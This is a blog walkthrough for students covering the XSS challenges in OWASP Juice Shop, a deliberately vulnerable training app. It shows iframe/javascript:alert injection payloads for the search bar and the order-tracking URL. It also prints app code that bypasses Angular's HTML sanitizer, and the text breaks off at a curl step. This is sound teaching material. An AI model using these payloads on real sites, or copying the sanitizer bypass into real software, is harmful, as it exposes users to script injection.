<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/x-icon" href="/assets/favicon.ico">
  <meta name="author" content="Zack Sargent">
  <meta property="article:author" content="Zack Sargent">
  <meta name="keywords" content="nkcyber, cybersecurity">
  <title> OWASP Juice Shop XSS Walkthrough </title>
  <meta name="twitter:title" content="OWASP Juice Shop XSS Walkthrough">
  <meta name="twitter:text:title" content="OWASP Juice Shop XSS Walkthrough">
  <meta name="twitter:description" content="A walkthrough for all of the XSS problems in OWASP&#39;s Juice Shop">
  <meta name="description" content="A walkthrough for all of the XSS problems in OWASP&#39;s Juice Shop">
  <meta name="og:description" content="A walkthrough for all of the XSS problems in OWASP&#39;s Juice Shop">
  <meta property="og:locale" content="en_US">
  <meta property="og:type" content="article">
  <meta property="og:url" content="https://zack.fyi/blog/juice-shop-answers.html">
  <link rel="canonical" href="https://zack.fyi/blog/juice-shop-answers.html">
  <meta property="article:published_time" content="2023-09-26T00:00:00+00:00">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/assets/common.css" > 
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Merriweather:ital,wght@0,300;0,400;0,700;0,900;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/anchor-js/anchor.min.js"></script>
</head>

<body>
  <header>
    <nav id="top-nav">
        <div class="logo">
            <a href="/">
                Zack Sargent
            </a>
        </div>
        <div class="links">
            <a href="/blog/index.html">Blog</a>
            <a href="/contact.html">Contact</a>
        </div>
    </nav>
</header>

  <main>
    <article class="post">
      <h1 class="post-title"> OWASP Juice Shop XSS Walkthrough</h1>
      <div id="post-meta">
        <span id="date-published">
          <i class="fa fa-calendar" aria-hidden="true"></i>
          <time datetime="2023-09-26" pubdate="pubdate">Tuesday, September 26, 2023</time>
        </span>
        <span id="reading-time">
          <i class="fa fa-clock-o" aria-hidden="true"></i> 
          16 mins
        </span>
        <span class="tags">
          <a href="/tag/nkcyber.html" class="tag">nkcyber</a> <a href="/tag/cybersecurity.html" class="tag">cybersecurity</a>
        </span>
      </div>

    <style>
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    color: #aaaaaa;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ff0000; font-weight: bold; } /* Alert */
code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { color: #7d9029; } /* Attribute */
code span.bn { color: #40a070; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
code span.ch { color: #4070a0; } /* Char */
code span.cn { color: #880000; } /* Constant */
code span.co { color: #60a0b0; font-style: italic; } /* Comment */
code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
code span.do { color: #ba2121; font-style: italic; } /* Documentation */
code span.dt { color: #902000; } /* DataType */
code span.dv { color: #40a070; } /* DecVal */
code span.er { color: #ff0000; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #40a070; } /* Float */
code span.fu { color: #06287e; } /* Function */
code span.im { } /* Import */
code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #007020; font-weight: bold; } /* Keyword */
code span.op { color: #666666; } /* Operator */
code span.ot { color: #007020; } /* Other */
code span.pp { color: #bc7a00; } /* Preprocessor */
code span.sc { color: #4070a0; } /* SpecialChar */
code span.ss { color: #bb6688; } /* SpecialString */
code span.st { color: #4070a0; } /* String */
code span.va { color: #19177c; } /* Variable */
code span.vs { color: #4070a0; } /* VerbatimString */
code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
</style>

<details id="table-of-contents" class="toc" role="doc-toc">
<summary id="table-of-contents-header"> Table of Contents </summary>

<ul>
<li><a href="#solutions">Solutions</a>
<ul>
<li><a href="#score-board">Score Board</a></li>
<li><a href="#dom-xss">DOM XSS</a></li>
<li><a href="#bonus-xss">Bonus XSS</a></li>
<li><a href="#reflected-xss-attack">Reflected XSS Attack</a></li>
<li><a href="#api-only-xss">API Only XSS</a></li>
</ul></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

</details>

<p>This writeup is to help <a href="https://www.nku.edu/academics/informatics/beyond/student-organizations/nkcyber.html">NKCyber</a> Club Members walk through the steps for the first 5 solutions to the XSS section of <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a>. See <a href="https://zack.fyi/blog/juice-shop.html">this page</a> for instructions on administering OWASP’s Juice Shop.</p>
<h1 id="solutions">Solutions</h1>
<h2 id="score-board">Score Board</h2>
<p>This challenge is a prerequisite for all others, as this challenge ensures you are able to see the score board.</p>
<p>Note that there are many challenges available on this platform, but we are only doing a small selection today.</p>
<p>Your first view of this wonderful website should be something like this:</p>
<figure>
<img src="../assets/juice-shop/image-20230926191329344.png" alt="Project Juice Shop Overview" /><figcaption aria-hidden="true">Project Juice Shop Overview</figcaption>
</figure>
<p>There are so many juice products that we could buy. However, beyond this innocent first page, this is secretly a platform for honing your hacking expertise.</p>
<p>If you look at the URL, you should see something like <code>http://localhost:3000/#/</code>, ending with a <code>#</code>. This gives us an important piece of information about the way the website is built: they must be using a Single Page App framework.</p>
<p>Anything that follows a <code>#</code> in a URL is not part of the server path, but is rather a ‘<a href="https://developer.mozilla.org/en-US/docs/Web/API/URL/hash">fragment identifier</a>’, originally intended to jump to a specific element id in your webpage.</p>
<p>However, a certain age of web frameworks developed before the browser history API was standardized rely on taking the data from the fragment identifier, and routing you to the correct page on the client. As such, we know that this Juice Shop must have a list of routes that you can access shipped to the client, so that the web framework knows what to do with any data that comes after the <code>#</code>. (For reference, <a href="https://owasp.org/2020/03/17/juice-shop-v10">Juice Shop is running Angular 9</a>.)</p>
<p>As such, we can open up the developer tools with <code>Right Click -&gt; Inspect</code> (or however your prefer), and then we can navigate to the <strong>sources</strong> tab.</p>
<figure>
<img src="../assets/juice-shop/image-20230926192920512.png" alt="The Sources Tab in Developer Tools" /><figcaption aria-hidden="true">The Sources Tab in Developer Tools</figcaption>
</figure>
<p>From there, we can search for files that specify paths to navigate to:</p>
<figure>
<img src="../assets/juice-shop/image-20230926193605854.png" alt="Searching for path: in Developer Tools -&gt; Sources" /><figcaption aria-hidden="true">Searching for <code>path:</code> in Developer Tools -&gt; Sources</figcaption>
</figure>
<p>From there, we can learn about some paths that might not have been intended to view:</p>
<figure>
<img src="../assets/juice-shop/image-20230926193712308.png" alt="score-board is listed as an available route" /><figcaption aria-hidden="true"><code>score-board</code> is listed as an available route</figcaption>
</figure>
<p>From there, we can navigate to <code>/#/score-board</code> to view the secret score board and get the flag.</p>
<figure>
<img src="../assets/juice-shop/image-20230926194106720.png" alt="You solved the challenge!" /><figcaption aria-hidden="true">You solved the challenge!</figcaption>
</figure>
<p>It will now be listed in your sidebar for easy access.</p>
<figure>
<img src="../assets/juice-shop/image-20230926193841512.png" alt="Score Board is easily accessible." /><figcaption aria-hidden="true">Score Board is easily accessible.</figcaption>
</figure>
<h2 id="dom-xss">DOM XSS</h2>
<p>First, let’s get on the same page with some definitions from the creators of the Juice Shop:</p>
<blockquote>
<p><strong>Cross-Site Scripting</strong> (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</p>
<p>— <cite><a href="https://owasp.org/www-community/attacks/xss/">OWASP’s Definition of XSS</a></cite></p>
</blockquote>
<blockquote>
<p><strong>DOM Based XSS</strong> […] is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.</p>
<p>— <cite><a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">OWASP’s Definition of DOM Based XSS</a></cite></p>
</blockquote>
<p>So, we know that we’re going to have to:</p>
<ol type="1">
<li>Give the web framework a request with a payload</li>
<li>Get make it directly insert that payload into the webpage, and execute it.</li>
</ol>
<p>Let’s take a look at the most accessible text entry field, the search bar:</p>
<figure>
<img src="../assets/juice-shop/image-20230926194737517.png" alt="The search bar on Juice Shop" /><figcaption aria-hidden="true">The search bar on Juice Shop</figcaption>
</figure>
<p>When we search for something, the result is prominently displayed at the top of the screen:</p>
<figure>
<img src="../assets/juice-shop/image-20230926194825451.png" alt="Search results, including our query" /><figcaption aria-hidden="true">Search results, including our query</figcaption>
</figure>
<p>So, the server will take whatever we text give it, and insert it into the page. Let’s see if we can give it HTML tags, with something like:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;h1&gt;</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    This should be a header</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/h1&gt;</span></span></code></pre></div>
<figure>
<img src="../assets/juice-shop/image-20230926194957072.png" alt="The result includes the HTML tag raw" /><figcaption aria-hidden="true">The result includes the HTML tag raw</figcaption>
</figure>
<p>Woah, would you look at that. We can enter in raw HTML tags.</p>
<p>Now, we just need to enter in the code indicated in the problem description:</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;iframe</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;javascript:alert(`xss`)&quot;</span><span class="kw">&gt;</span></span></code></pre></div>
<figure>
<img src="../assets/juice-shop/image-20230926195227532.png" alt="Flag obtained" /><figcaption aria-hidden="true">Flag obtained</figcaption>
</figure>
<h2 id="bonus-xss">Bonus XSS</h2>
<p>In a very similar solution, you should be able to enter the specified code:</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;iframe</span> <span class="er">width</span><span class="ot">=</span><span class="st">&quot;100%&quot;</span> <span class="er">height</span><span class="ot">=</span><span class="st">&quot;166&quot;</span> <span class="er">scrolling</span><span class="ot">=</span><span class="st">&quot;no&quot;</span> <span class="er">frameborder</span><span class="ot">=</span><span class="st">&quot;no&quot;</span> <span class="er">allow</span><span class="ot">=</span><span class="st">&quot;autoplay&quot;</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076</span><span class="er">&amp;</span><span class="st">color=%23ff5500</span><span class="er">&amp;</span><span class="st">auto_play=true</span><span class="er">&amp;</span><span class="st">hide_related=false</span><span class="er">&amp;</span><span class="st">show_comments=true</span><span class="er">&amp;</span><span class="st">show_user=true</span><span class="er">&amp;</span><span class="st">show_reposts=false</span><span class="er">&amp;</span><span class="st">show_teaser=true&quot;</span><span class="kw">&gt;&lt;/iframe&gt;</span></span></code></pre></div>
<p>into the search bar:</p>
<figure>
<img src="../assets/juice-shop/image-20230926195851865.png" alt="iframe is injected into the search bar" /><figcaption aria-hidden="true">iframe is injected into the search bar</figcaption>
</figure>
<p>and see the result pop up on the page to get the flag:</p>
<figure>
<img src="../assets/juice-shop/image-20230926195914598.png" alt="SoundCloud Embed is injected properly" /><figcaption aria-hidden="true">SoundCloud Embed is injected properly</figcaption>
</figure>
<p>The takeaway here is that <code>iframe</code> elements can be used to load dynamic content, potentially including malicious scripts.</p>
<p><strong>Troubleshooting:</strong></p>
<p>If you’re not receiving the flag, ensure you’re navigating to the correct url in the iframe. You might want to directly copy this from the Juice Shop Score Board.</p>
<h2 id="reflected-xss-attack">Reflected XSS Attack</h2>
<blockquote>
<p>Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a “trusted” server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-I XSS (the attack is carried out through a single request / response cycle).</p>
<p>— <cite><a href="https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks">OWASP’s Definition of Reflected XSS Attacks</a></cite></p>
</blockquote>
<p>So, we know that we’re going to have to:</p>
<ol type="1">
<li>Give the server a request with a payload</li>
<li>Get a response that directly inserts that payload into the webpage, and executes it.</li>
</ol>
<p>Note that we don’t need the server to actually store the data.</p>
<p>Let’s create an account at <code>/#/login</code>. Then, we navigate to <code>/#/register</code>, because we’re not a customer.</p>
<figure>
<img src="../assets/juice-shop/image-20230926201914743.png" alt="Juice Shop Registration" /><figcaption aria-hidden="true">Juice Shop Registration</figcaption>
</figure>
<p>Now that we’re logged in, we can add items to our basket:</p>
<figure>
<img src="../assets/juice-shop/image-20230926201958095.png" alt="Juice Shop, logged in" /><figcaption aria-hidden="true">Juice Shop, logged in</figcaption>
</figure>
<p>Now, we can review products:</p>
<figure>
<img src="../assets/juice-shop/image-20230926202109115.png" alt="You can write a review by clicking on the item" /><figcaption aria-hidden="true">You can write a review by clicking on the item</figcaption>
</figure>
<p>And it’ll show up!</p>
<figure>
<img src="../assets/juice-shop/image-20230926202211348.png" alt="The comment is stored on the server." /><figcaption aria-hidden="true">The comment is stored on the server.</figcaption>
</figure>
<p>Can you do HTML formatting?</p>
<figure>
<img src="../assets/juice-shop/image-20230926202314011.png" alt="Nope" /><figcaption aria-hidden="true">Nope</figcaption>
</figure>
<p>Unfortunately not :(</p>
<p>At this point, I checked out <a href="https://github.com/refabr1k/owasp-juiceshop-solutions/blob/master/Level1/reflected-xss.md#reflected-xss">this solution on GitHub</a>, and found that you need to order an item in the Juice Shop. I’ve added this as a hint for the competition, because I think there’s a lot of surface area on the application, that makes this attack vector less than obvious.</p>
<p>Basically, you need to add an item to your cart.</p>
<p>You’ll be prompted to add an address:</p>
<figure>
<img src="../assets/juice-shop/image-20230926203201902.png" alt="Please don’t use your real address" /><figcaption aria-hidden="true">Please don’t use your real address</figcaption>
</figure>
<p>And then you can add your payment information:</p>
<figure>
<img src="../assets/juice-shop/image-20230926203311098.png" alt="Please don’t use a real credit card either" /><figcaption aria-hidden="true">Please don’t use a real credit card either</figcaption>
</figure>
<p>Now we can place our order:</p>
<figure>
<img src="../assets/juice-shop/image-20230926203349278.png" alt="The Order Summary" /><figcaption aria-hidden="true">The Order Summary</figcaption>
</figure>
<p>And we’ll see that the “Thank you for your purchase screen” is at a URL with a tracking ID: <code>/#/order-completion/3f7b-e60171eddcbd36a5</code>.</p>
<p>From there, we can navigate to <code>/#/track-result/new?id=3f7b-e60171eddcbd36a5</code>, and see that the text is <em>reflected</em> into the page:</p>
<figure>
<img src="../assets/juice-shop/image-20230926203742567.png" alt="Our id is shown on the page" /><figcaption aria-hidden="true">Our id is shown on the page</figcaption>
</figure>
<p>Navigating to <code>/#/track-result/new?id=&lt;i&gt;test&lt;/i&gt;</code> shows us text in italic, so that’s a good indication that the input is not sanitized. Entering the payload:</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;iframe</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;javascript:alert(`xss`)&quot;</span><span class="kw">&gt;</span></span></code></pre></div>
<p>into the URL: <code>/#/track-result/new?id=%3Ciframe%20src=%22javascript:alert(%60xss%60)%22%3E</code></p>
<p>Gives us the flag. (Note this URL is represented using URL encoded characters. Your browser will likely do this automatically.)</p>
<h2 id="api-only-xss">API Only XSS</h2>
<p>So, now we need to perform a <em>persisted</em> XSS attack.</p>
<blockquote>
<p><strong>Stored attacks</strong> are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-II XSS.</p>
<p>— <cite><a href="https://owasp.org/www-community/attacks/xss/#stored-xss-attacks">OWASP’s Definition for Stored XXS Attacks</a></cite></p>
</blockquote>
<p>And, the free hint for this problem is <a href="https://angular.io/api/core/AfterViewInit">an Angular hook</a>.</p>
<details>
<summary>
View full code
</summary>
<div class="sourceCode" id="cb5"><pre class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ngAfterViewInit</span> () {</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    const products <span class="op">=</span> this<span class="op">.</span><span class="at">productService</span><span class="op">.</span><span class="fu">search</span>(<span class="st">&#39;&#39;</span>)</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    const quantities <span class="op">=</span> this<span class="op">.</span><span class="at">quantityService</span><span class="op">.</span><span class="fu">getAll</span>()</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">forkJoin</span>([quantities<span class="op">,</span> products])<span class="op">.</span><span class="fu">subscribe</span>(([quantities<span class="op">,</span> products]) <span class="kw">=&gt;</span> {</span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>        const dataTable<span class="op">:</span> TableEntry[] <span class="op">=</span> []</span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="at">tableData</span> <span class="op">=</span> products</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="fu">trustProductDescription</span>(products)</span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>        <span class="fu">for</span> (const product of products) {</span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>            dataTable<span class="op">.</span><span class="fu">push</span>({</span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>                name<span class="op">:</span> product<span class="op">.</span><span class="at">name</span><span class="op">,</span></span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>                price<span class="op">:</span> product<span class="op">.</span><span class="at">price</span><span class="op">,</span></span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>                deluxePrice<span class="op">:</span> product<span class="op">.</span><span class="at">deluxePrice</span><span class="op">,</span></span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>                id<span class="op">:</span> product<span class="op">.</span><span class="at">id</span><span class="op">,</span></span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>                image<span class="op">:</span> product<span class="op">.</span><span class="at">image</span><span class="op">,</span></span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>                description<span class="op">:</span> product<span class="op">.</span><span class="at">description</span></span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>            })</span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>        }</span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>        <span class="fu">for</span> (const quantity of quantities) {</span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>            const entry <span class="op">=</span> dataTable<span class="op">.</span><span class="fu">find</span>((dataTableEntry) <span class="kw">=&gt;</span> {</span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>                return dataTableEntry<span class="op">.</span><span class="at">id</span> <span class="op">===</span> quantity<span class="op">.</span><span class="at">ProductId</span></span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>            })</span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>            <span class="fu">if</span> (entry <span class="op">===</span> undefined) {</span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>                continue</span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>            }</span>
<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>            entry<span class="op">.</span><span class="at">quantity</span> <span class="op">=</span> quantity<span class="op">.</span><span class="at">quantity</span></span>
<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>        }</span>
<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="at">dataSource</span> <span class="op">=</span> <span class="kw">new</span> <span class="fu">MatTableDataSource</span>(dataTable)</span>
<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>        <span class="fu">for</span> (let i <span class="op">=</span> <span class="dv">1</span><span class="op">;</span> i <span class="op">&lt;=</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">ceil</span>(this<span class="op">.</span><span class="at">dataSource</span><span class="op">.</span><span class="at">data</span><span class="op">.</span><span class="at">length</span> <span class="op">/</span> <span class="dv">12</span>)<span class="op">;</span> i<span class="op">++</span>) {</span>
<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>            this<span class="op">.</span><span class="at">pageSizeOptions</span><span class="op">.</span><span class="fu">push</span>(i <span class="op">*</span> <span class="dv">12</span>)</span>
<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a>        }</span>
<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="at">paginator</span><span class="op">.</span><span class="at">pageSizeOptions</span> <span class="op">=</span> this<span class="op">.</span><span class="at">pageSizeOptions</span></span>
<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="at">dataSource</span><span class="op">.</span><span class="at">paginator</span> <span class="op">=</span> this<span class="op">.</span><span class="at">paginator</span></span>
<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="at">gridDataSource</span> <span class="op">=</span> this<span class="op">.</span><span class="at">dataSource</span><span class="op">.</span><span class="fu">connect</span>()</span>
<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="at">resultsLength</span> <span class="op">=</span> this<span class="op">.</span><span class="at">dataSource</span><span class="op">.</span><span class="at">data</span><span class="op">.</span><span class="at">length</span></span>
<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="fu">filterTable</span>()</span>
<span id="cb5-36"><a href="#cb5-36" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="at">routerSubscription</span> <span class="op">=</span> this<span class="op">.</span><span class="at">router</span><span class="op">.</span><span class="at">events</span><span class="op">.</span><span class="fu">subscribe</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb5-37"><a href="#cb5-37" aria-hidden="true" tabindex="-1"></a>            this<span class="op">.</span><span class="fu">filterTable</span>()</span>
<span id="cb5-38"><a href="#cb5-38" aria-hidden="true" tabindex="-1"></a>        })</span>
<span id="cb5-39"><a href="#cb5-39" aria-hidden="true" tabindex="-1"></a>        <span class="fu">if</span> (window<span class="op">.</span><span class="at">innerWidth</span> <span class="op">&lt;</span> <span class="dv">2600</span>) {</span>
<span id="cb5-40"><a href="#cb5-40" aria-hidden="true" tabindex="-1"></a>            this<span class="op">.</span><span class="at">breakpoint</span> <span class="op">=</span> <span class="dv">4</span></span>
<span id="cb5-41"><a href="#cb5-41" aria-hidden="true" tabindex="-1"></a>            <span class="fu">if</span> (window<span class="op">.</span><span class="at">innerWidth</span> <span class="op">&lt;</span> <span class="dv">1740</span>) {</span>
<span id="cb5-42"><a href="#cb5-42" aria-hidden="true" tabindex="-1"></a>                this<span class="op">.</span><span class="at">breakpoint</span> <span class="op">=</span> <span class="dv">3</span></span>
<span id="cb5-43"><a href="#cb5-43" aria-hidden="true" tabindex="-1"></a>                <span class="fu">if</span> (window<span class="op">.</span><span class="at">innerWidth</span> <span class="op">&lt;</span> <span class="dv">1280</span>) {</span>
<span id="cb5-44"><a href="#cb5-44" aria-hidden="true" tabindex="-1"></a>                    this<span class="op">.</span><span class="at">breakpoint</span> <span class="op">=</span> <span class="dv">2</span></span>
<span id="cb5-45"><a href="#cb5-45" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">if</span> (window<span class="op">.</span><span class="at">innerWidth</span> <span class="op">&lt;</span> <span class="dv">850</span>) {</span>
<span id="cb5-46"><a href="#cb5-46" aria-hidden="true" tabindex="-1"></a>                        this<span class="op">.</span><span class="at">breakpoint</span> <span class="op">=</span> <span class="dv">1</span></span>
<span id="cb5-47"><a href="#cb5-47" aria-hidden="true" tabindex="-1"></a>                    }</span>
<span id="cb5-48"><a href="#cb5-48" aria-hidden="true" tabindex="-1"></a>                }</span>
<span id="cb5-49"><a href="#cb5-49" aria-hidden="true" tabindex="-1"></a>            }</span>
<span id="cb5-50"><a href="#cb5-50" aria-hidden="true" tabindex="-1"></a>        } else {</span>
<span id="cb5-51"><a href="#cb5-51" aria-hidden="true" tabindex="-1"></a>            this<span class="op">.</span><span class="at">breakpoint</span> <span class="op">=</span> <span class="dv">6</span></span>
<span id="cb5-52"><a href="#cb5-52" aria-hidden="true" tabindex="-1"></a>        }</span>
<span id="cb5-53"><a href="#cb5-53" aria-hidden="true" tabindex="-1"></a>        this<span class="op">.</span><span class="at">cdRef</span><span class="op">.</span><span class="fu">detectChanges</span>()</span>
<span id="cb5-54"><a href="#cb5-54" aria-hidden="true" tabindex="-1"></a>    }<span class="op">,</span> (err) <span class="kw">=&gt;</span> { <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(err) })</span>
<span id="cb5-55"><a href="#cb5-55" aria-hidden="true" tabindex="-1"></a>}</span>
<span id="cb5-56"><a href="#cb5-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-57"><a href="#cb5-57" aria-hidden="true" tabindex="-1"></a><span class="fu">trustProductDescription</span> (tableData<span class="op">:</span> <span class="dt">any</span>[]) {</span>
<span id="cb5-58"><a href="#cb5-58" aria-hidden="true" tabindex="-1"></a>    <span class="fu">for</span> (let i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> tableData<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
<span id="cb5-59"><a href="#cb5-59" aria-hidden="true" tabindex="-1"></a>        tableData[i]<span class="op">.</span><span class="at">description</span> <span class="op">=</span> this<span class="op">.</span><span class="at">sanitizer</span><span class="op">.</span><span class="fu">bypassSecurityTrustHtml</span>(tableData[i]<span class="op">.</span><span class="at">description</span>)</span>
<span id="cb5-60"><a href="#cb5-60" aria-hidden="true" tabindex="-1"></a>    }</span>
<span id="cb5-61"><a href="#cb5-61" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
</details>
<p>So, we can see that the HTML is trusted in the table description by <code>trustProductDescription</code>. This is a good place to attack.</p>
<p>Looking at the page <code>/#/order-history</code>, we search for <code>/api</code> in the <code>main.js</code> sources, and we can find that <code>/api/Products</code> is where all of the products come from.</p>
<p>I personally solved this using cURL, as shown below, but I also <a href="https://youtu.be/M0a5DIQhRVI">saw people use Burp Suite</a>, which looked pretty powerful. That’s definitely something I need to practice more. John Hammond has a good <a href="https://youtu.be/G3hpAeoZ4ek">introduction to Burp Suite</a> on YouTube.</p>
<p>So, I first got the results of the endpoint:</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-Ssl</span> http://localhost:3000/api/Products <span class="kw">|</span> <span class="fu">head</span> </span>
